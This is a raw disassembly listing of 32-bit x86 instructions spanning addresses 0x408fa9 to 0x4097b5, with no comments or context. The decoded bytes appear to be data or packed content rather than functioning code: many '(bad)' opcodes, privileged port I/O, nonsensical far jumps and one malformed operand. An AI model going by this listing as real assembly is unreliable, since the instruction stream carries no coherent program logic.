  408fa9:	loope  0x408f48
  408fab:	jae    0x408f86
  408fad:	push   ebx
  408fae:	repz arpl ax,ax
  408fb1:	add    BYTE PTR [ebx],bl
  408fb3:	jnp    0x408f3b
  408fb5:	scas   eax,DWORD PTR es:[edi]
  408fb6:	aam    0x5f
  408fb8:	adc    al,0xe6
  408fba:	adc    BYTE PTR [esi+edx*4-0x2987165c],dl
  408fc1:	mov    bh,bl
  408fc3:	cmp    cl,dh
  408fc5:	mov    bh,0xec
  408fc7:	idiv   BYTE PTR [edi+0x1485ad6a]
  408fcd:	inc    ecx
  408fce:	out    dx,al
  408fcf:	inc    esi
  408fd0:	imul   edx,DWORD PTR [ebx],0xdf28f08b
  408fd6:	(bad)  
  408fd7:	adc    DWORD PTR [ecx-0x14],ebp
  408fda:	sub    edx,ebp
  408fdc:	clc    
  408fdd:	xchg   BYTE PTR [ebp-0x439826fc],bl
  408fe3:	jb     0x408f70
  408fe5:	dec    esi
  408fe6:	ret    0x5258
  408fe9:	lea    edi,[ebp+0x41bbfdd4]
  408fef:	cdq    
  408ff0:	bound  edi,QWORD PTR [edi+eax*4+0x5437af6d]
  408ff7:	ss inc esp
  408ff9:	sub    eax,0x70649ec1
  408ffe:	sbb    bh,0xf5
  409001:	or     esp,DWORD PTR [ecx+0x85c43ec]
  409007:	or     eax,0xb7cfbc02
  40900c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40900d:	iret   
  40900e:	adc    eax,0xc9f3557d
  409013:	jle    0x409024
  409015:	in     eax,0x47
  409017:	jle    0x40906e
  409019:	fmul   QWORD PTR [ecx+0x41]
  40901c:	xchg   ebx,eax
  40901d:	pop    esi
  40901e:	jl     0x409010
  409020:	sub    eax,0xc0e4f543
  409025:	jnp    0x408fc9
  409027:	cmp    cl,BYTE PTR [ebp+0x22c2c950]
  40902d:	fs xor eax,0xeab24ab6
  409033:	pop    es
  409034:	in     eax,0x82
  409036:	xchg   edi,eax
  409037:	push   es
  409038:	js     0x409007
  40903a:	ds cmp esi,esp
  40903d:	adc    edx,DWORD PTR [esi-0x40e45cc]
  409043:	push   ebp
  409044:	aad    0xd6
  409046:	or     dh,cl
  409048:	rol    BYTE PTR [ebp+0x379eda2e],0x20
  40904f:	sbb    al,0x2c
  409051:	and    eax,0xace56248
  409056:	test   al,0x6d
  409058:	mov    BYTE PTR [ebx+0x37],bl
  40905b:	push   edi
  40905c:	fisubr DWORD PTR [ebx+ebx*1+0x7a74581d]
  409063:	out    dx,eax
  409064:	aad    0x18
  409066:	aaa    
  409067:	call   0x47ac8d9a
  40906c:	fsub   DWORD PTR es:[ebx+0x3ed8867f]
  409073:	and    al,0x79
  409075:	fst    st(0)
  409077:	or     esp,DWORD PTR [edi-0x2b3d0c33]
  40907d:	xchg   BYTE PTR [esi+0x72c67581],dl
  409083:	push   edi
  409084:	dec    eax
  409085:	jne    0x40901c
  409087:	shl    BYTE PTR [eax+0x37],cl
  40908a:	cmp    eax,DWORD PTR [ecx+eiz*1+0x4c]
  40908e:	sub    DWORD PTR [edx],0xdccc2919
  409094:	mov    ds:0x9354b950,al
  409099:	or     eax,0x7ba9c9a1
  40909e:	and    al,0x73
  4090a0:	fistp  WORD PTR [esi-0x6]
  4090a3:	adc    al,0x7c
  4090a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a6:	ins    DWORD PTR es:[edi],dx
  4090a7:	or     al,0x97
  4090a9:	out    dx,al
  4090aa:	ret    
  4090ab:	cmp    edi,esi
  4090ad:	xchg   ecx,eax
  4090ae:	fistp  QWORD PTR [edx-0x6b]
  4090b1:	test   al,0xa2
  4090b3:	imul   esi,eax,0xfffffffe
  4090b6:	mov    ebp,0xe45802be
  4090bb:	loop   0x409111
  4090bd:	ret    0x7308
  4090c0:	out    dx,al
  4090c1:	(bad)  
  4090c2:	call   0x5d200adb
  4090c7:	stos   DWORD PTR es:[edi],eax
  4090c8:	mov    ds:0x3cd0bde,eax
  4090cd:	test   BYTE PTR [ebp-0x6317f4f5],al
  4090d3:	(bad)  
  4090d4:	fisttp QWORD PTR [ecx]
  4090d6:	in     al,dx
  4090d7:	das    
  4090d8:	int    0x13
  4090da:	cli    
  4090db:	jb     0x40908b
  4090dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090de:	inc    esi
  4090df:	dec    ebp
  4090e0:	loopne 0x4090f5
  4090e2:	mov    al,ds:0x69ded185
  4090e7:	cs popf 
  4090e9:	xor    eax,DWORD PTR [esi+0x6eadc137]
  4090ef:	sub    bl,BYTE PTR [ebx+0x425b05fc]
  4090f5:	loope  0x409131
  4090f7:	loope  0x4090f9
  4090f9:	into   
  4090fa:	and    eax,0x85f767bd
  4090ff:	jl     0x40909c
  409101:	pop    esi
  409102:	push   ebx
  409103:	jp     0x409121
  409105:	jb     0x409159
  409107:	jns    0x4090b7
  409109:	(bad)
  40910d:	repnz mov dh,0xba
  409110:	dec    esp
  409111:	sub    BYTE PTR [edi-0x6],0x94
  409115:	and    dh,BYTE PTR [ebx]
  409117:	addr16 sub al,0xcf
  40911a:	xchg   esi,eax
  40911b:	jl     0x409150
  40911d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40911e:	dec    edi
  40911f:	aas    
  409120:	pop    ds
  409121:	and    eax,0x9ed4c18
  409126:	addr16 add eax,0x1e208f06
  40912c:	add    bh,0xbb
  40912f:	aas    
  409130:	jle    0x40915b
  409132:	jo     0x409179
  409134:	push   ss
  409135:	test   al,0x41
  409137:	rcr    ch,cl
  409139:	mov    ebx,DWORD PTR [edx-0x80]
  40913c:	jmp    0x7b43d9c7
  409141:	fisttp QWORD PTR [ebx+edi*1]
  409144:	dec    ebx
  409145:	gs xchg bl,ch
  409148:	xlat   BYTE PTR ds:[ebx]
  409149:	jb     0x4091b8
  40914b:	sub    eax,0x8e3d0d93
  409150:	adc    BYTE PTR [ecx],cl
  409152:	mov    dh,0x79
  409154:	out    0x8,al
  409156:	dec    ecx
  409157:	push   edx
  409158:	xchg   esi,eax
  409159:	xchg   esi,eax
  40915a:	mov    edi,ebp
  40915c:	inc    esp
  40915d:	ss xchg esi,eax
  40915f:	ins    DWORD PTR es:[edi],dx
  409160:	test   al,0x8d
  409162:	jno    0x409188
  409164:	inc    ecx
  409165:	xchg   edx,eax
  409166:	outs   dx,DWORD PTR ds:[esi]
  409167:	dec    ecx
  409168:	push   cs
  409169:	adc    ah,cl
  40916b:	push   ebx
  40916c:	aad    0x68
  40916e:	mov    ebp,0x286fc1ea
  409173:	repnz std 
  409175:	nop
  409176:	mov    ds:0x8cd43259,al
  40917b:	xchg   ebp,eax
  40917c:	adc    ch,al
  40917e:	pop    edx
  40917f:	aam    0x13
  409181:	xor    eax,DWORD PTR [edi+0x39]
  409184:	xchg   edx,eax
  409185:	fcom   QWORD PTR [esp+esi*4+0x6c]
  409189:	sub    edi,DWORD PTR [eax]
  40918b:	push   edi
  40918c:	(bad)  
  40918d:	adc    al,0xf
  40918f:	arpl   WORD PTR [ebx+edx*2+0x22],bp
  409193:	stos   BYTE PTR es:[edi],al
  409194:	adc    DWORD PTR [edx],ecx
  409196:	outs   dx,BYTE PTR ds:[esi]
  409197:	jle    0x40911b
  409199:	or     eax,0x63dd1fcb
  40919e:	dec    ebp
  40919f:	es inc ebp
  4091a1:	cmp    bl,dl
  4091a3:	mov    cl,0x11
  4091a5:	in     al,0x73
  4091a7:	jae    0x409146
  4091a9:	scas   al,BYTE PTR es:[edi]
  4091aa:	lds    esp,FWORD PTR [ebx]
  4091ac:	cmp    BYTE PTR [ebx-0x79],al
  4091af:	mov    edx,0xcdbdad2a
  4091b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091b5:	mov    ecx,0x4a66eae5
  4091ba:	xor    BYTE PTR [edi],0xb3
  4091bd:	retf   0xf1c
  4091c0:	call   0xe39179b6
  4091c5:	add    ah,BYTE PTR [ecx-0x43]
  4091c8:	dec    edi
  4091c9:	jmp    0x94c2:0x1b38d1f6
  4091d0:	sbb    BYTE PTR [eax+0x64],0xda
  4091d4:	gs enter 0x786d,0x2f
  4091d9:	mov    ah,0x9
  4091db:	imul   esp,esp,0x5f
  4091de:	ffreep st(5)
  4091e0:	push   es
  4091e1:	push   ss
  4091e2:	cmp    DWORD PTR [esi-0x56f320ae],edi
  4091e8:	scas   al,BYTE PTR es:[edi]
  4091e9:	addr16 daa 
  4091eb:	clc    
  4091ec:	not    esp
  4091ee:	jl     0x409206
  4091f0:	sub    DWORD PTR [ebp-0x59b7e69a],esi
  4091f6:	sar    BYTE PTR [ebx+0x23],0x1d
  4091fa:	cld    
  4091fb:	scas   al,BYTE PTR es:[edi]
  4091fc:	repz jb 0x4091b8
  4091ff:	clc    
  409200:	ins    BYTE PTR es:[edi],dx
  409201:	dec    esi
  409202:	and    BYTE PTR [ebp+eax*4-0x3d573698],al
  409209:	(bad)  
  40920a:	lds    esi,FWORD PTR [ebp-0x6c2ceb7d]
  409210:	in     eax,0xfd
  409212:	xor    BYTE PTR fs:[edx+0x6a],dh
  409216:	iret   
  409217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409218:	push   esi
  409219:	mov    esi,0x4912c7d0
  40921e:	sbb    dl,BYTE PTR [edx+0x409857cb]
  409224:	cld    
  409225:	push   ebp
  409226:	add    ebx,DWORD PTR [ebp+ebx*2-0x19]
  40922a:	xlat   BYTE PTR ds:[ebx]
  40922b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922c:	ret    
  40922d:	fcmovnbe st,st(0)
  40922f:	cmp    eax,0xe79ba605
  409234:	enter  0x9553,0x61
  409238:	fwait
  409239:	push   ebp
  40923a:	test   eax,0x54ac64af
  40923f:	(bad)  
  409240:	xor    al,0x18
  409242:	pop    es
  409243:	jnp    0x4092b8
  409245:	aam    0xa2
  409247:	scas   eax,DWORD PTR es:[di]
  409249:	fdivp  st(3),st
  40924b:	cwde   
  40924c:	ja     0x409265
  40924e:	mov    WORD PTR [esi],?
  409250:	ja     0x4091e3
  409252:	and    eax,0x98d47e26
  409257:	mov    esi,0x52f74459
  40925c:	pop    edi
  40925d:	fild   DWORD PTR [esi]
  40925f:	aaa    
  409260:	inc    esi
  409261:	(bad)  
  409262:	mov    bl,0x32
  409264:	xchg   DWORD PTR [esi-0x6520adf1],ebp
  40926a:	test   DWORD PTR ds:0xe27c2276,ecx
  409270:	xor    al,0xcf
  409272:	or     ch,bh
  409274:	pushf  
  409275:	cmp    BYTE PTR [edx-0x218bd2bb],dh
  40927b:	mov    edx,DWORD PTR [ebx+edx*1]
  40927e:	int    0x72
  409280:	in     al,0xf2
  409282:	mov    cl,0xb
  409284:	inc    esp
  409285:	stos   DWORD PTR es:[edi],eax
  409286:	dec    ebp
  409287:	inc    esi
  409288:	cld    
  409289:	xchg   ebx,eax
  40928a:	push   esi
  40928b:	out    dx,eax
  40928c:	sbb    eax,0x9630c4a
  409291:	jmp    0x409256
  409293:	lods   al,BYTE PTR ds:[esi]
  409294:	out    0x3b,eax
  409296:	push   0xffffffa1
  409298:	icebp  
  409299:	and    eax,0x345d557b
  40929e:	sub    DWORD PTR [esi],eax
  4092a0:	sbb    ch,BYTE PTR [edx+0x28]
  4092a3:	lock into 
  4092a5:	or     cl,bh
  4092a7:	cmp    al,0x9f
  4092a9:	jmp    0x17b1:0xa302e1a5
  4092b0:	fmul   st,st(1)
  4092b2:	add    al,0xb
  4092b4:	sbb    BYTE PTR [ebx],ah
  4092b6:	pop    ss
  4092b7:	adc    BYTE PTR [ebp-0x60a7bc6c],bl
  4092bd:	jae    0x409311
  4092bf:	repz mov esi,DWORD PTR ss:[eax-0x53]
  4092c4:	and    ebp,ebp
  4092c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c7:	mov    al,BYTE PTR [esi]
  4092c9:	push   0x8222222b
  4092ce:	retf   0x67b9
  4092d1:	xchg   BYTE PTR [edx],ch
  4092d3:	jne    0x409278
  4092d5:	sub    bh,al
  4092d7:	jmp    0xcd6c:0x48a7949e
  4092de:	xchg   esi,eax
  4092df:	mov    BYTE PTR [ebx+edi*4+0x531247fd],cl
  4092e6:	push   0xadc32ea0
  4092eb:	xor    ah,BYTE PTR [edx-0x500192aa]
  4092f1:	imul   edx,ebx,0xe13a8e62
  4092f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f8:	mov    bh,0x2e
  4092fa:	leave  
  4092fb:	add    eax,0x9e28985d
  409300:	test   eax,0x77933afa
  409305:	dec    edi
  409306:	clc    
  409307:	inc    esp
  409308:	sti    
  409309:	pop    edx
  40930a:	daa    
  40930b:	sbb    DWORD PTR [esp+eiz*2+0x285ee2b],esp
  409312:	cmp    BYTE PTR [ebp+0x7cf09355],cl
  409318:	mov    dl,0xc6
  40931a:	inc    esp
  40931b:	jge    0x4092f2
  40931d:	pop    edx
  40931e:	and    esi,ebp
  409320:	push   ds
  409321:	pusha  
  409322:	fwait
  409323:	xchg   DWORD PTR [esi],esi
  409325:	and    ebp,edx
  409327:	xor    al,0x31
  409329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40932a:	mov    ebx,DWORD PTR [edx+0x59c94a48]
  409330:	sub    edi,DWORD PTR [ebx+0x23ac9094]
  409336:	imul   edx
  409338:	popf   
  409339:	packsswb mm1,mm7
  40933c:	adc    esi,DWORD PTR [edi-0x4d58f3cb]
  409342:	mov    al,ds:0xd6dab321
  409347:	pop    esp
  409348:	arpl   ax,sp
  40934a:	jle    0x409325
  40934c:	int    0x62
  40934e:	test   DWORD PTR [edi+0x6801487f],ebp
  409354:	retf   0x1542
  409357:	out    dx,eax
  409358:	mov    esp,0x8105a48
  40935d:	cmp    dh,bl
  40935f:	mov    bh,0x6b
  409361:	pushf  
  409362:	xchg   ecx,eax
  409363:	arpl   di,ax
  409365:	mov    dl,0x64
  409367:	cmc    
  409368:	pop    edx
  409369:	ss jmp 0x4093b3
  40936c:	mov    ds:0x97aae7f5,eax
  409371:	mov    esi,0x7fac27a0
  409376:	ror    edx,cl
  409378:	retf   
  409379:	ins    DWORD PTR es:[edi],dx
  40937a:	dec    BYTE PTR [edx+0xb]
  40937d:	lock mov eax,DWORD PTR [edx+0x4f]
  409381:	lahf   
  409382:	mov    BYTE PTR [esi-0x1a],ch
  409385:	dec    esi
  409386:	(bad)  
  409387:	push   cs
  409388:	mov    ecx,0x61457f3a
  40938d:	mov    ecx,0x30f06808
  409392:	arpl   WORD PTR [esp+eiz*2],bx
  409395:	jg     0x40937a
  409397:	pop    ds
  409398:	xchg   al,bl
  40939a:	pop    DWORD PTR [edx]
  40939c:	fnstsw WORD PTR ds:0xce1faee7
  4093a2:	add    eax,0x5fc9876e
  4093a7:	add    BYTE PTR [edx],ah
  4093a9:	(bad)  
  4093aa:	stc    
  4093ab:	aad    0xd2
  4093ad:	pop    edx
  4093ae:	or     DWORD PTR [esi],ebp
  4093b0:	sbb    DWORD PTR [ecx],edi
  4093b2:	cwde   
  4093b3:	ds retf 0x555e
  4093b7:	pop    esp
  4093b8:	cmp    DWORD PTR [edi-0x40097ccb],ecx
  4093be:	xlat   BYTE PTR ds:[ebx]
  4093bf:	aam    0x5d
  4093c1:	je     0x4093a2
  4093c3:	mov    ecx,0xf1857d40
  4093c8:	pop    edi
  4093c9:	mov    BYTE PTR [esi+edx*4],al
  4093cc:	adc    DWORD PTR ds:0x8e35ee94,eax
  4093d2:	fistp  QWORD PTR [ebx+0x23]
  4093d5:	cld    
  4093d6:	sub    ecx,DWORD PTR [ecx+0x672fcd78]
  4093dc:	jp     0x40938b
  4093de:	cmp    BYTE PTR [ebx],al
  4093e0:	cmp    esp,DWORD PTR [ecx+eax*8+0x5e541376]
  4093e7:	aas    
  4093e8:	push   ecx
  4093e9:	push   0x6a5ba94c
  4093ee:	push   ss
  4093ef:	xlat   BYTE PTR ds:[ebx]
  4093f0:	sub    esi,DWORD PTR [edi+0x62]
  4093f3:	scas   eax,DWORD PTR es:[edi]
  4093f4:	(bad)  
  4093f5:	loopne 0x40941e
  4093f7:	sub    DWORD PTR [ebp-0x5293873],ebx
  4093fd:	das    
  4093fe:	xlat   BYTE PTR ds:[ebx]
  4093ff:	jae    0x40945a
  409401:	cmp    BYTE PTR [ebp+0x46feecc3],bh
  409407:	push   0xffffffc0
  409409:	fcmovb st,st(1)
  40940b:	cmp    al,0xf9
  40940d:	and    al,0xfd
  40940f:	fucom  st(1)
  409411:	sahf   
  409412:	add    al,bl
  409414:	dec    edi
  409415:	mov    ch,0x54
  409417:	repz int3 
  409419:	je     0x409467
  40941b:	adc    ecx,DWORD PTR [edx+edi*2+0x46d1883d]
  409422:	dec    edx
  409423:	addr16 out dx,al
  409425:	in     eax,0xfc
  409427:	and    eax,0x1e9136c7
  40942c:	mov    al,ds:0xb7573132
  409431:	scas   al,BYTE PTR es:[edi]
  409432:	dec    esp
  409433:	or     BYTE PTR gs:[edx-0x3a],0xa5
  409438:	enter  0xe85,0xbb
  40943c:	push   edx
  40943d:	loope  0x409481
  40943f:	fbstp  TBYTE PTR [ebx]
  409441:	mov    dh,0x11
  409443:	jle    0x409425
  409445:	aas    
  409446:	repz push edi
  409448:	dec    ebx
  409449:	and    al,0x3e
  40944b:	(bad)  
  40944c:	retf   
  40944d:	xor    DWORD PTR [ecx],esi
  40944f:	adc    eax,0xaac029fb
  409454:	retf   0xdf66
  409457:	mov    edx,0x9f6d3c07
  40945c:	jne    0x4093e5
  40945e:	dec    esp
  40945f:	loopne 0x409458
  409461:	out    dx,eax
  409462:	dec    ecx
  409463:	adc    ecx,DWORD PTR [edx+ebx*8-0x2e3d742b]
  40946a:	sbb    eax,0x5d118060
  40946f:	lds    ebp,FWORD PTR [eax-0x7e9bf9db]
  409475:	xor    eax,0xda1b41ca
  40947a:	test   eax,0x4eaf26a7
  40947f:	inc    ebp
  409480:	arpl   WORD PTR [edi+ebp*1],bp
  409483:	cmpxchg DWORD PTR [eax],eax
  409486:	mov    DWORD PTR [edx+0x67],ecx
  409489:	inc    ebp
  40948a:	mov    ds:0x1a675854,al
  40948f:	push   edx
  409490:	loop   0x409468
  409492:	push   edi
  409493:	jbe    0x409495
  409495:	mov    dh,0xb0
  409497:	dec    ch
  409499:	mov    ebx,0x6d2303ef
  40949e:	xchg   ebp,eax
  4094a0:	rcr    DWORD PTR [ebx-0x98e10ba],cl
  4094a6:	jle    0x40945a
  4094a8:	fs mov edi,eax
  4094ab:	xchg   esi,eax
  4094ac:	rol    BYTE PTR [ebp-0x5a],0x5b
  4094b0:	sbb    ah,BYTE PTR [ebx+0x4b]
  4094b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094b4:	xor    al,0x8b
  4094b7:	xor    cl,BYTE PTR [edx+0x3ad8dca8]
  4094bd:	ins    BYTE PTR es:[edi],dx
  4094be:	mov    ebp,0x20051f13
  4094c3:	popf   
  4094c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c5:	jne    0x409448
  4094c7:	(bad)  
  4094c8:	test   al,0x6b
  4094ca:	xlat   BYTE PTR ds:[ebx]
  4094cb:	pop    es
  4094cc:	dec    ebx
  4094cd:	iret   
  4094ce:	int    0x35
  4094d0:	in     al,0x82
  4094d2:	cld    
  4094d3:	out    0x28,eax
  4094d5:	popf   
  4094d6:	test   DWORD PTR ds:0x211a2e87,0x8e27b21b
  4094e0:	(bad)
  4094e3:	shl    DWORD PTR [ecx+0x68],cl
  4094e6:	or     edi,DWORD PTR [edi-0x62]
  4094e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ea:	(bad)  
  4094eb:	retf   
  4094ec:	icebp  
  4094ed:	aas    
  4094ee:	sbb    al,0xcb
  4094f0:	xchg   esi,eax
  4094f1:	xchg   edi,eax
  4094f2:	xor    dl,ch
  4094f4:	jo     0x409522
  4094f6:	jmp    0x40956e
  4094f8:	cdq    
  4094f9:	ja     0x40956c
  4094fb:	out    dx,al
  4094fc:	dec    edx
  4094fd:	jnp    0x40948a
  4094ff:	add    dh,BYTE PTR [ecx]
  409501:	cmp    eax,0x7f7fbf85
  409506:	(bad)  
  409507:	addr16 jp 0x40954c
  40950a:	jle    0x4094e2
  40950c:	scas   eax,DWORD PTR es:[edi]
  40950d:	xchg   ebp,eax
  40950e:	add    esp,DWORD PTR [eax+edi*4]
  409511:	pop    esp
  409512:	mov    WORD PTR [ecx+0x1e2f96b7],ss
  409518:	pop    edi
  409519:	adc    ch,BYTE PTR [edx]
  40951b:	inc    esp
  40951c:	mov    dh,0x2f
  40951e:	mov    al,0x51
  409520:	mov    al,ds:0x36b37162
  409525:	enter  0x35d3,0x64
  409529:	pop    ss
  40952a:	sar    edx,1
  40952c:	jns    0x40951b
  40952e:	mov    ebx,gs
  409530:	xor    esp,DWORD PTR [edx+0x56]
  409533:	idiv   BYTE PTR [ebp+0x33]
  409536:	sar    BYTE PTR [ebp+ebp*2+0x6c3cd5cb],1
  40953d:	jb     0x40955c
  40953f:	or     ch,BYTE PTR [ebp-0x64b618e3]
  409545:	mov    edi,0xe0aead2a
  40954a:	into   
  40954b:	nop
  40954c:	mov    al,0x77
  40954e:	xor    BYTE PTR [esi+0x4543cbd1],0xdc
  409555:	call   0x8f42f39f
  40955a:	mov    esp,0xf43ac93b
  40955f:	push   es
  409560:	fs inc ebx
  409562:	in     eax,dx
  409563:	pop    esp
  409564:	cmp    al,0x56
  409566:	and    esp,DWORD PTR [ebx+0x4ee28fff]
  40956c:	repz out 0x86,eax
  40956f:	sub    BYTE PTR [ebx-0xd3a1cdd],ch
  409575:	rcl    DWORD PTR [eax+0x2c0fb9eb],0x91
  40957c:	pop    eax
  40957d:	mov    ah,0x2c
  40957f:	lock and esi,DWORD PTR [ebp+0x27b95e18]
  409586:	mov    ecx,0x902736ad
  40958b:	adc    eax,DWORD PTR [ebx-0x6b7c7591]
  409591:	jg     0x4095db
  409593:	pop    ebp
  409594:	imul   edx,DWORD PTR [ecx+0x1ccf9a1f],0xcd1376e3
  40959e:	jle    0x409573
  4095a0:	out    dx,eax
  4095a1:	push   es
  4095a2:	ins    DWORD PTR es:[edi],dx
  4095a3:	jecxz  0x40958e
  4095a5:	xor    ecx,DWORD PTR [esi]
  4095a7:	mov    ch,0x6c
  4095a9:	pusha  
  4095aa:	lock xchg DWORD PTR [edi-0x6d7a272c],esi
  4095b1:	pop    edx
  4095b2:	jle    0x4095d0
  4095b4:	and    BYTE PTR [ebx+esi*2],cl
  4095b7:	outs   dx,DWORD PTR ds:[esi]
  4095b8:	retf   0x90f9
  4095bb:	in     al,dx
  4095bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095bd:	pop    ebx
  4095be:	je     0x409580
  4095c0:	bound  esi,QWORD PTR [ebx+0x1c48e7a4]
  4095c6:	and    ebx,edx
  4095c8:	(bad)  
  4095c9:	sub    ebx,ebp
  4095cb:	fdivr  st,st(5)
  4095cd:	ret    0x2437
  4095d0:	(bad)  
  4095d1:	mov    al,ds:0x4a629a54
  4095d6:	icebp  
  4095d7:	jl     0x40955c
  4095d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095da:	imul   ecx,DWORD PTR [ecx+0x12],0x90f9e834
  4095e1:	adc    DWORD PTR [ebx+0x25],esp
  4095e4:	out    0x64,eax
  4095e6:	rcl    BYTE PTR [edx-0x219cf4fd],1
  4095ec:	mov    ebx,0x24ebf50b
  4095f1:	xchg   edi,eax
  4095f2:	aaa    
  4095f3:	inc    ebx
  4095f4:	popa   
  4095f5:	lock mov DWORD PTR [edi+0x45],ecx
  4095f9:	sub    esi,0xffffffbe
  4095fc:	les    ecx,FWORD PTR [eax+edx*4+0x3c62a173]
  409603:	xchg   ebx,eax
  409604:	scas   al,BYTE PTR es:[edi]
  409605:	sahf   
  409606:	test   ah,bl
  409608:	js     0x409630
  40960a:	inc    edi
  40960b:	jmp    0x409629
  40960d:	hlt    
  40960e:	les    esp,FWORD PTR [edi-0x1c]
  409611:	rcl    ch,1
  409613:	pop    cx
  409615:	call   0xfceb:0xbcc5002b
  40961c:	cmp    BYTE PTR [edi],0xd4
  40961f:	sub    dl,BYTE PTR [ebp+0x3b5464cd]
  409625:	jbe    0x409651
  409627:	and    ecx,DWORD PTR [edi]
  409629:	adc    BYTE PTR [eax-0x4cea9068],dh
  40962f:	jecxz  0x40965d
  409631:	ret    0x7b3d
  409634:	jg     0x40960f
  409636:	shl    BYTE PTR [eax+eax*8+0x1ed3d5cb],cl
  40963d:	(bad)  
  40963e:	and    al,0x14
  409640:	nop
  409641:	inc    esi
  409642:	jne    0x409622
  409644:	push   ebp
  409645:	idiv   esp
  409647:	lea    esp,[ecx]
  409649:	pusha  
  40964a:	push   eax
  40964b:	jnp    0x40964f
  40964d:	addr16 popf 
  40964f:	xchg   edx,eax
  409650:	mov    ecx,0xfb1b926f
  409655:	(bad)  
  409656:	or     al,0x3f
  409658:	sbb    eax,0x68efbbf5
  40965d:	cmp    eax,0xb5743fb
  409662:	push   0x854140e1
  409667:	cmp    eax,0x9ee9313f
  40966c:	mov    ah,0x3b
  40966e:	fist   DWORD PTR ds:0x26ee3af4
  409674:	sub    BYTE PTR [ecx+0x31e43f0b],0xe2
  40967b:	jle    0x409683
  40967d:	out    dx,al
  40967e:	inc    ebx
  40967f:	loopne 0x4096f3
  409681:	imul   edx,DWORD PTR [esi+0x63],0xffffff91
  409685:	int    0x91
  409687:	aaa    
  409688:	(bad)  
  409689:	fadd   st,st(0)
  40968b:	xchg   edx,eax
  40968c:	mov    cl,0x4a
  40968e:	cmp    ebx,edi
  409690:	mov    esp,0x8921dca
  409695:	cld    
  409696:	dec    esi
  409697:	sub    esp,esp
  409699:	outs   dx,BYTE PTR ds:[esi]
  40969a:	dec    ebx
  40969b:	out    0x98,eax
  40969d:	fst    DWORD PTR [edi-0x5e]
  4096a0:	ins    DWORD PTR es:[edi],dx
  4096a1:	pop    ebx
  4096a2:	iret   
  4096a3:	inc    ecx
  4096a4:	and    eax,0xf27f10e9
  4096a9:	(bad)  
  4096aa:	sbb    ebp,esp
  4096ac:	cld    
  4096ad:	dec    esp
  4096ae:	outs   dx,BYTE PTR ds:[esi]
  4096af:	cmp    ah,BYTE PTR [ecx+0x520eaeb4]
  4096b5:	push   ebp
  4096b6:	inc    esp
  4096b7:	mov    eax,0x822120b7
  4096bc:	mov    ebx,0x9d6d4081
  4096c1:	xor    BYTE PTR [edi+0x460a5137],cl
  4096c7:	mov    ds:0x78f24db7,eax
  4096cc:	mov    esi,0x12ab7413
  4096d1:	jo     0x40970d
  4096d3:	sbb    BYTE PTR [edx],cl
  4096d5:	xchg   ebp,eax
  4096d6:	push   esi
  4096d7:	pop    ds
  4096d8:	loope  0x40973a
  4096da:	(bad)  
  4096db:	sbb    DWORD PTR [edi+0x1a45b2db],edi
  4096e1:	jnp    0x4096bc
  4096e3:	sub    DWORD PTR [ecx-0xa2d2369],ebp
  4096e9:	mov    ecx,0x80245ff5
  4096ee:	aaa    
  4096ef:	repnz loopne 0x409677
  4096f2:	push   ecx
  4096f3:	sub    dl,BYTE PTR [edi+eax*2]
  4096f6:	repnz inc esi
  4096f8:	rcr    DWORD PTR gs:[ebx],cl
  4096fb:	icebp  
  4096fc:	adc    dh,BYTE PTR [edx+0x16edcd5c]
  409702:	sar    BYTE PTR [edx+0x3a45cf9c],0x7
  409709:	mov    al,ds:0x41ad3fe1
  40970e:	push   edx
  40970f:	std    
  409710:	icebp  
  409711:	xor    eax,0x5fd07d87
  409716:	cld    
  409717:	mov    ah,0xd1
  409719:	ret    0x1588
  40971c:	lock fisttp QWORD PTR [ecx+0xd537ad9]
  409723:	sbb    al,0x53
  409725:	icebp  
  409726:	(bad)  
  409727:	gs dec edi
  409729:	mov    ecx,0x12731e35
  40972e:	mul    ch
  409730:	aas    
  409731:	(bad)  
  409732:	mov    ebx,0x3bfd2430
  409737:	fdivr  QWORD PTR [edi]
  409739:	mov    esi,0xb26b1ceb
  40973e:	xor    al,0x11
  409740:	(bad)  
  409741:	sub    DWORD PTR [ecx+ebp*1+0x39],0xffffff82
  409746:	inc    ecx
  409747:	mov    cl,0x19
  409749:	mov    dl,BYTE PTR [edx+ebp*8-0x7a]
  40974d:	adc    BYTE PTR [bp+si-0x5c7d],ah
  409752:	mov    ah,0x76
  409754:	mov    ds:0x93042afd,al
  409759:	xor    bh,BYTE PTR [esi-0x30b02122]
  40975f:	inc    esi
  409760:	mov    bh,0xdf
  409762:	jb     0x4097d4
  409764:	add    edi,DWORD PTR [esi]
  409766:	mov    ah,dh
  409768:	mov    eax,0xbc9657b3
  40976d:	into   
  40976e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40976f:	and    al,0x6a
  409771:	jmp    0x118a:0x79bf897
  409778:	int3   
  409779:	sbb    BYTE PTR [esp+edi*1-0x2c],dh
  40977d:	mov    ebp,ebx
  40977f:	inc    edi
  409780:	xor    ebp,DWORD PTR [ebx+ebx*8+0x69]
  409784:	mov    eax,ds:0x99a6c1a0
  409789:	xor    cl,BYTE PTR [edx]
  40978b:	dec    ecx
  40978c:	pop    ecx
  40978d:	adc    BYTE PTR [ecx-0x1d0ed44b],al
  409793:	repnz fldenv [eax]
  409796:	iret   
  409797:	sub    eax,0x8098a8d0
  40979c:	fimul  WORD PTR [edx-0x50ad5970]
  4097a2:	int3   
  4097a3:	mov    edi,DWORD PTR [ebx+0x6494e846]
  4097a9:	inc    ebp
  4097aa:	fdivr  DWORD PTR [ecx+0x73b7d8e6]
  4097b0:	mov    ds:0xc5d7ad04,eax
  4097b5:	outs   dx,BYTE PTR ds:[esi]
